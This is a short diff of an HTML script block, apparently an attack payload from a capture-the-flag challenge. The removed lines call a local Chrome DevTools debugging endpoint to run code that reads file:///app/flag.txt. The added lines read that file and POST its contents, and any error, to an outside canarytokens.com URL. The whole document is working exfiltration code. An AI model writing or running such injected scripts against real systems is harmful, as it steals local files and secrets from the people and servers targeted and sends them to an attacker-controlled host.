@@ -1,9 +1,16 @@
 <script>
-  fetch('http://127.0.0.1:9223/json/runtime/evaluate', {
-  method: 'POST',
-  body: JSON.stringify({
-    expression: "fetch('file:///app/flag.txt').then(r => r.text()).then(console.log)",
-    returnByValue: true
+fetch('file:///app/flag.txt')
+  .then(response => response.text())
+  .then(data => {
+    fetch('http://canarytokens.com/traffic/images/feedback/b0isgmcjy5fuvogxw8ulf0nti/payments.js', {
+      method: 'POST',
+      body: 'flag=' + encodeURIComponent(data)
+    });
   })
-});
+  .catch(error => {
+    fetch('http://canarytokens.com/traffic/images/feedback/b0isgmcjy5fuvogxw8ulf0nti/payments.js', {
+      method: 'POST',
+      body: 'error=' + encodeURIComponent(error.toString())
+    });
+  });
 </script>
